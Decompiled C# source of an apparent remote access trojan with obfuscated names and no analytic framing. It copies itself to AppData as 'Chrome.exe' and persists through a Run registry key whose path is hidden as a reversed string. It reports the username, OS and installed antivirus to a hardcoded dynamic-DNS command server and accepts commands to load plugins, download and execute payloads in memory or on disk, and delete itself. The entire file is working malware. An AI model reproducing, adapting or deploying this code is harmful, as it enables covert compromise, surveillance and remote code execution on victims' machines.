using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace YhiVtbLuZpLMyQi;

internal class txViqPFoNQVuO
{
	private static readonly object nMWFeLVYim = new object();

	private static Mutex PAjlumIWsvBKew;

	private static TcpClient JBRUjruGTXVr;

	private static MemoryStream xYITVqxKKhOL;

	private static byte[] buaAyXFYfYJa = new byte[4];

	private static readonly string tFhwPdwvUVZ = "|NW|";

	private static bool AcfwaVKdYnQwb = false;

	private static Timer pghKFCgCzIznyMkp = null;

	private static readonly string JkMrZVtckuRJBZ = "6889e848-cc14-46c2-b5ee-a6c21ef1c2a9";

	private static readonly string SAPJybYXIsy = "v0.3.6";

	private static readonly string eQwNFZTBSqgfYCBb = "ksmkzfra12345.ddns.net";

	private static readonly string OkFAlQkjINHz = "1010";

	private static string tNrTvTsJtMdYIoBS = "1";

	public static readonly string IOnTXxrWFqxJl = Path.Combine(Environment.ExpandEnvironmentVariables("%AppData%"), "Chrome.exe");

	private static void qldybXEgYugM()
	{
		Thread.Sleep(2000);
		if (!qkwcVJHcDPYoPXQDV())
		{
			Environment.Exit(0);
		}
		XONuIpiJMonV();
		Thread thread = new Thread(NDCFZlCktcmgTne);
		thread.Start();
	}

	private static void oEmBeIWMzBERdkDld()
	{
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append("Info" + tFhwPdwvUVZ);
		stringBuilder.Append(OHyjWgHOBwsXNc().Substring(0, 15) + tFhwPdwvUVZ);
		stringBuilder.Append(Environment.UserName + tFhwPdwvUVZ);
		stringBuilder.Append(new ComputerInfo().get_OSFullName().ToString() + tFhwPdwvUVZ);
		stringBuilder.Append(SAPJybYXIsy + tFhwPdwvUVZ);
		stringBuilder.Append(hyuQshrGbQydfL() + tFhwPdwvUVZ);
		stringBuilder.Append(File.GetLastWriteTime(Process.GetCurrentProcess().MainModule!.FileName).ToShortDateString() + tFhwPdwvUVZ);
		stringBuilder.Append(Process.GetCurrentProcess().MainModule!.FileName + tFhwPdwvUVZ);
		tQhbczxiAcqK(stringBuilder.ToString());
	}

	private static string OHyjWgHOBwsXNc()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(Environment.UserDomainName);
		stringBuilder.Append(Environment.UserName);
		stringBuilder.Append(Environment.ProcessorCount);
		stringBuilder.Append(new ComputerInfo().get_OSFullName().ToString());
		return GcxyFibwbxUBFzuYaDLcR(stringBuilder.ToString());
	}

	private static string GcxyFibwbxUBFzuYaDLcR(string pdfABezsEbHY)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(pdfABezsEbHY);
		bytes = mD5CryptoServiceProvider.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = bytes;
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString("x2"));
		}
		return stringBuilder.ToString();
	}

	private static string hyuQshrGbQydfL()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.get_Current();
					stringBuilder.Append(current.get_Item("displayName").ToString());
					stringBuilder.Append(",");
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (stringBuilder.ToString().Length == 0)
			{
				return "None";
			}
			return stringBuilder.ToString().Substring(0, stringBuilder.Length - 1);
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private static void xgjHLvTBMKeT()
	{
		tQhbczxiAcqK("received");
	}

	private static void lKcSvKjiJJUdDz(object JljeiRyhXDADqLEoAYmqt)
	{
		try
		{
			string[] array = Encoding.UTF8.GetString((byte[])JljeiRyhXDADqLEoAYmqt).Split(new string[1] { tFhwPdwvUVZ }, StringSplitOptions.None);
			switch (array[0])
			{
			case "del":
				qaslCKkWvVldRDBEZd();
				break;
			case "restart":
				doYtyrKKwYJBv();
				try
				{
					JBRUjruGTXVr.Client.Shutdown(SocketShutdown.Both);
					JBRUjruGTXVr.Close();
				}
				catch
				{
				}
				Process.Start(Process.GetCurrentProcess().MainModule!.FileName);
				Environment.Exit(0);
				break;
			case "close":
				doYtyrKKwYJBv();
				try
				{
					JBRUjruGTXVr.Client.Shutdown(SocketShutdown.Both);
					JBRUjruGTXVr.Close();
				}
				catch
				{
				}
				Environment.Exit(0);
				break;
			case "plugin":
				xgjHLvTBMKeT();
				SETrPYEAFXkNkkeWsFuy(array[1], array[2]);
				break;
			case "runFile":
			{
				xgjHLvTBMKeT();
				if (array[3] == "mem")
				{
					Thread thread = new Thread(oxlpTjYTrlvAuQeBPTUQlT);
					thread.Start(array[1]);
					break;
				}
				string text = Path.GetTempFileName() + array[2];
				File.WriteAllBytes(text, Convert.FromBase64String(Strings.StrReverse(array[1])));
				Process.Start(text);
				if (array[3] == "true")
				{
					qaslCKkWvVldRDBEZd();
				}
				break;
			}
			}
		}
		catch (Exception ex)
		{
			tQhbczxiAcqK("error " + tFhwPdwvUVZ + " " + ex.Message);
		}
		finally
		{
			GC.Collect();
		}
	}

	private static void oxlpTjYTrlvAuQeBPTUQlT(object fmOATXxHRCA)
	{
		try
		{
			Assembly assembly = AppDomain.CurrentDomain.Load(Convert.FromBase64String(Strings.StrReverse((string)fmOATXxHRCA)));
			MethodInfo entryPoint = assembly.EntryPoint;
			object obj = assembly.CreateInstance(entryPoint.Name);
			object[] parameters = new string[1];
			if (entryPoint.GetParameters().Length == 0)
			{
				parameters = null;
			}
			entryPoint.Invoke(obj, parameters);
		}
		catch (Exception ex)
		{
			tQhbczxiAcqK("error " + tFhwPdwvUVZ + " " + ex.Message);
		}
	}

	private static void SETrPYEAFXkNkkeWsFuy(string ItWcvbVwhXgMCTL, string iYnbvBWXfGEKyoZiph)
	{
		try
		{
			Assembly assembly = AppDomain.CurrentDomain.Load(Convert.FromBase64String(Strings.StrReverse(ItWcvbVwhXgMCTL)));
			MethodInfo method = assembly.GetType("Plugin.Plugin")!.GetMethod("Initialize");
			object obj = assembly.CreateInstance(method.Name);
			int num = (int)method.Invoke(obj, null);
			if (num > 0)
			{
				tQhbczxiAcqK(iYnbvBWXfGEKyoZiph + tFhwPdwvUVZ + num);
			}
		}
		catch (Exception ex)
		{
			tQhbczxiAcqK("error " + tFhwPdwvUVZ + " " + ex.Message);
		}
	}

	private static void qaslCKkWvVldRDBEZd()
	{
		try
		{
			try
			{
				Registry.CurrentUser.CreateSubKey(Strings.StrReverse("\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteValue(Path.GetFileName(IOnTXxrWFqxJl));
			}
			catch
			{
			}
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule!.FileName + "\"";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = "cmd.exe";
			doYtyrKKwYJBv();
			try
			{
				JBRUjruGTXVr.Client.Shutdown(SocketShutdown.Both);
				JBRUjruGTXVr.Close();
			}
			catch
			{
			}
			Process.Start(processStartInfo);
			Environment.Exit(0);
		}
		catch
		{
		}
	}

	private static void NDCFZlCktcmgTne()
	{
		while (true)
		{
			if (AcfwaVKdYnQwb)
			{
				try
				{
					if (!JBRUjruGTXVr.Connected)
					{
						AcfwaVKdYnQwb = false;
					}
					else
					{
						if (!JBRUjruGTXVr.Client.Poll(-1, SelectMode.SelectRead) || JBRUjruGTXVr.Available != 0)
						{
							while (xYITVqxKKhOL.Length != 4L)
							{
								int num = JBRUjruGTXVr.Client.Receive(buaAyXFYfYJa, 0, buaAyXFYfYJa.Length, SocketFlags.None);
								if (num != 0)
								{
									xYITVqxKKhOL.Write(buaAyXFYfYJa, 0, num);
									continue;
								}
								AcfwaVKdYnQwb = false;
								break;
							}
							int num2 = BitConverter.ToInt32(xYITVqxKKhOL.ToArray(), 0);
							xYITVqxKKhOL.Dispose();
							xYITVqxKKhOL = new MemoryStream();
							if (num2 <= 0)
							{
								continue;
							}
							buaAyXFYfYJa = new byte[num2];
							while (xYITVqxKKhOL.Length != num2)
							{
								int num3 = JBRUjruGTXVr.Client.Receive(buaAyXFYfYJa, 0, buaAyXFYfYJa.Length, SocketFlags.None);
								if (num3 != 0)
								{
									xYITVqxKKhOL.Write(buaAyXFYfYJa, 0, num3);
									continue;
								}
								AcfwaVKdYnQwb = false;
								break;
							}
							ThreadPool.QueueUserWorkItem(lKcSvKjiJJUdDz, tHzfPbhQyWDmS(xYITVqxKKhOL.ToArray()));
							xYITVqxKKhOL.Dispose();
							xYITVqxKKhOL = new MemoryStream();
							buaAyXFYfYJa = new byte[4];
							continue;
						}
						AcfwaVKdYnQwb = false;
					}
				}
				catch
				{
					AcfwaVKdYnQwb = false;
				}
			}
			while (!AcfwaVKdYnQwb)
			{
				try
				{
					Thread.Sleep(new Random().Next(1000, 5000));
					try
					{
						if (pghKFCgCzIznyMkp != null)
						{
							pghKFCgCzIznyMkp.Dispose();
						}
						if (JBRUjruGTXVr != null)
						{
							JBRUjruGTXVr.Client.Close();
						}
					}
					catch
					{
					}
					AcfwaVKdYnQwb = false;
					JBRUjruGTXVr = new TcpClient();
					JBRUjruGTXVr.Connect(eQwNFZTBSqgfYCBb, Convert.ToInt32(OkFAlQkjINHz));
					AcfwaVKdYnQwb = true;
					xYITVqxKKhOL = new MemoryStream();
					buaAyXFYfYJa = new byte[4];
					oEmBeIWMzBERdkDld();
					pghKFCgCzIznyMkp = new Timer(lMNGthMIElcXWA, null, new Random().Next(10000, 30000), new Random().Next(10000, 30000));
				}
				catch
				{
				}
			}
		}
	}

	private static void tQhbczxiAcqK(object eXSgofgpWKTjkAlgvf)
	{
		lock (nMWFeLVYim)
		{
			try
			{
				if (!JBRUjruGTXVr.Connected)
				{
					AcfwaVKdYnQwb = false;
					return;
				}
				byte[] array = HRVOMreuoNvTp(Encoding.UTF8.GetBytes(eXSgofgpWKTjkAlgvf.ToString()));
				byte[] bytes = BitConverter.GetBytes(array.Length);
				JBRUjruGTXVr.Client.Poll(-1, SelectMode.SelectWrite);
				JBRUjruGTXVr.Client.Send(bytes, 0, bytes.Length, SocketFlags.None);
				JBRUjruGTXVr.Client.Send(array, 0, array.Length, SocketFlags.None);
			}
			catch
			{
				AcfwaVKdYnQwb = false;
			}
		}
	}

	private static void XONuIpiJMonV()
	{
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		if (IOnTXxrWFqxJl.Equals(fileName))
		{
			return;
		}
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.MainModule!.FileName == IOnTXxrWFqxJl)
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			FileStream fileStream = ((!File.Exists(IOnTXxrWFqxJl)) ? new FileStream(IOnTXxrWFqxJl, FileMode.CreateNew) : new FileStream(IOnTXxrWFqxJl, FileMode.Create));
			byte[] array = File.ReadAllBytes(fileName);
			fileStream.Write(array, 0, array.Length);
			fileStream.Dispose();
			Registry.CurrentUser.CreateSubKey(Strings.StrReverse("\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue(Path.GetFileName(IOnTXxrWFqxJl), IOnTXxrWFqxJl);
			doYtyrKKwYJBv();
			Process.Start(IOnTXxrWFqxJl);
			Environment.Exit(0);
		}
		catch
		{
		}
	}

	private static void lMNGthMIElcXWA(object tFnboCsLJnQQYiW)
	{
		tQhbczxiAcqK("pongPing");
	}

	private static byte[] HRVOMreuoNvTp(byte[] XnYyAtBmhQoeZm)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(tNrTvTsJtMdYIoBS));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			return cryptoTransform.TransformFinalBlock(XnYyAtBmhQoeZm, 0, XnYyAtBmhQoeZm.Length);
		}
		catch
		{
		}
		return null;
	}

	private static byte[] tHzfPbhQyWDmS(byte[] aOnRepcNMWeCEiH)
	{
		try
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(tNrTvTsJtMdYIoBS));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			return cryptoTransform.TransformFinalBlock(aOnRepcNMWeCEiH, 0, aOnRepcNMWeCEiH.Length);
		}
		catch
		{
		}
		return null;
	}

	private static bool qkwcVJHcDPYoPXQDV()
	{
		PAjlumIWsvBKew = new Mutex(initiallyOwned: false, JkMrZVtckuRJBZ, out var createdNew);
		return createdNew;
	}

	private static void doYtyrKKwYJBv()
	{
		if (PAjlumIWsvBKew != null)
		{
			PAjlumIWsvBKew.Close();
			PAjlumIWsvBKew = null;
		}
	}
}
